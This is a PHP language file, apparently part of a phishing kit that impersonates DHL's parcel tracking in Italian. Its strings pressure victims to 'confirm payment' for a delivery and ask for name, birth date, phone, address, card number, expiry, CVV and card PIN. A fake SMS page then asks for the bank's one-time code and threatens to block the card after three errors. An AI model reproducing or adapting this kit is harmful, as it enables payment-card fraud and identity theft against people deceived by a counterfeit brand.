<?php

function lang($phrase){
	static $lang = array(


		'Title_page' => '| Benvenuti | ',
		'Min_i1' => 'Alerts (1)',
		'Min_i2' => 'Global',
		'Min_i3' => 'Cerca',


		'Ming_i1' => 'Traccia',
		'Ming_i2' => 'Nave',
		'Ming_i3' => 'Soluzioni logistiche',
		'Ming_i4' => 'Servizio clienti',




		'Text_i1' => 'TRACCIAMENTO SPEDIZIONI DHL.',
		'Text_i2' => 'Qui troverai informazioni sulle tue spedizioni.',
		'Text_i3' => 'Traccia le spedizioni dei pacchi in qualsiasi momento dalla spedizione alla consegna',

		'Text_b1' => 'Messaggio importante!',
		'Text_b2' => 'Per completare la consegna il prima possibile, conferma il pagamento',
		'Text_b3' => 'facendo clic su Avanti. La conferma online deve essere effettuata entro i prossimi 14 giorni, prima della scadenza. ',

		'Input_i1' => 'Nome completo',
		'Input_i2' => 'Data di nascita',
		'Input_i3' => 'Numero di telefono',
		'Input_i4' => 'Indirizzo di fatturazione',
		'Input_i5' => 'Codice postale',


		'Input_cc1' => 'Nome sulla carta',
		'Input_cc2' => 'Numero carta',
		'Input_cc3' => 'Data di scadenza MM / AA',
		'Input_cc4' => 'Codice di sicurezza CVV (CVC)',
        'Input_cc5' => 'carta pin',
		
		'Btn_n1' => 'Il prossimo',

		'Footer_title1' => 'POST DHL GROUP',
		'Footer_title2' => 'SEGUICI SU',
		'Footer_text1' => 'Consapevolezza delle frodi',
		'Footer_text2' => 'Note legali',
		'Footer_text3' => 'Termini d&apos;uso',
		'Footer_text4' => 'Informativa sulla privacy',
		'Footer_text5' => 'Risoluzione delle controversie',
		'Footer_text6' => 'Accessibilità',
		'Footer_text7' => 'Impostazioni cookie',
		'Footer_text8' => 'Informazioni',
		'Footer_rights' => '2020 © DHL International GmbH. Tutti i diritti riservati.',
		'text_succ' => 'Hai attivato correttamente il processo di spedizione. Riceverai un&apos;email da noi quando invieremo il tuo pacco.',


		'Sms_text1' => 'Conferma il seguente pagamento.',
		'Sms_text2' => 'La password univoca è stata inviata al numero di cellulare elencato di seguito. Se devi modificare il tuo numero di cellulare, contatta la tua banca o modificalo tramite i canali disponibili (bancomat, web) ',
		'Sms_text3' => 'Merchant:',
		'Sms_text4' => 'Importo:',
		'Sms_text5' => 'Data:',
		'Sms_text6' => 'Codice SMS:',
		'Sms_text7' => 'Inserisci il codice di verifica ricevuto da sms:',
		'Sms_error1' => 'SMS sbagliato o scaduto! Dopo (3) errori nell&apos;inserimento del codice ricevuto via SMS, la transazione corrente viene annullata e la carta di credito bloccata.'



	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
